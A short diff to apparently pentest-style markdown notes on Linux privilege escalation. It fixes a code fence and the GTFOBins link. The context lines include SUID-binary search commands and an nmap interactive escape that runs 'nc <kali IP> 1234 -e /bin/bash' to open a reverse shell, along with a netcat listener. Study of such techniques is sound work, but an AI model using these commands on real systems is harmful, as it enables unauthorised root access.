@@ -38,6 +38,7 @@ check weather the /etc/password and /etc/shadow are having write permissions
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -4000 -type f 2>/dev/null
+```
 - if the linux machine is having nmap installe in suid file then we can use it to escalate the privileges
 ```bash
 nmap --interactive
@@ -51,5 +52,7 @@ nmap> ! nc <kali IP> 1234 -e /bin/bash
 nc -lvp 1234    
 ```
 - GTFOBINS is helpful to find the suid files and how to use them to escalate the privileges
-Gtfobins link: https://gtfobins.com/
+Gtfobins link: https://gtfobins.github.io/
 
+
+- 
